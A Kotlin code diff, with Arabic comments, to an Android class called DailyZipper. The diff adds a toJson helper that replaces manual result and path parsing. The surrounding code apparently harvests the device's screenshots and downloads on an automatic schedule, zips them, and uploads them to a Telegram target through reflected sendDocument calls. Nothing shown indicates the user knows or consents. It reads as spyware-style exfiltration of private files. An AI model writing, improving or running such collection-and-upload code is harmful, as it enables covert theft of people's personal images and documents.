@@ -78,6 +78,28 @@ class DailyZipper(
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
             return DailyZipper(context, scanner, telegram)
         }
+
+        // ===== دالة مساعدة آمنة لتحويل أي كائن إلى JSONObject =====
+        private fun toJson(obj: Any?): JSONObject? {
+            return when (obj) {
+                is JSONObject -> obj
+                is Map<*, *> -> {
+                    try {
+                        @Suppress("UNCHECKED_CAST")
+                        JSONObject(obj as Map<String, Any?>)
+                    } catch (e: Exception) {
+                        null
+                    }
+                }
+                else -> {
+                    try {
+                        JSONObject(obj.toString())
+                    } catch (e: Exception) {
+                        null
+                    }
+                }
+            }
+        }
     }
 
     init {
@@ -266,7 +288,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - بدون استخدام JSONObject مباشر لتجنب التعارض
+    //  إرسال الملفات إلى Telegram - باستخدام الدالة المساعدة toJson
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,22 +323,9 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج قيمة "ok" بدون استخدام JSONObject أو get
-                val success = when (result) {
-                    is Boolean -> result
-                    is JSONObject -> result.optBoolean("ok", false)
-                    is Map<*, *> -> {
-                        var ok = false
-                        for (entry in result.entries) {
-                            if (entry.key.toString() == "ok") {
-                                ok = entry.value as? Boolean == true
-                                break
-                            }
-                        }
-                        ok
-                    }
-                    else -> false
-                }
+                // استخدام الدالة المساعدة toJson لتحويل النتيجة إلى JSONObject
+                val json = toJson(result)
+                val success = json?.optBoolean("ok", false) ?: false
 
                 if (success) {
                     return true
@@ -623,7 +632,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - بدون استخدام JSONObject مباشر
+    //  التشغيل التلقائي - باستخدام الدالة المساعدة toJson
     // ============================================================
 
     fun run(): Boolean {
@@ -644,21 +653,9 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار بدون استخدام JSONObject
-                            val path = when (item) {
-                                is JSONObject -> item.optString("path", "")
-                                is Map<*, *> -> {
-                                    var p = ""
-                                    for (entry in item.entries) {
-                                        if (entry.key.toString() == "path") {
-                                            p = entry.value?.toString() ?: ""
-                                            break
-                                        }
-                                    }
-                                    p
-                                }
-                                else -> ""
-                            }
+                            // استخدام الدالة المساعدة toJson لتحويل العنصر إلى JSONObject
+                            val json = toJson(item)
+                            val path = json?.optString("path", "") ?: ""
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
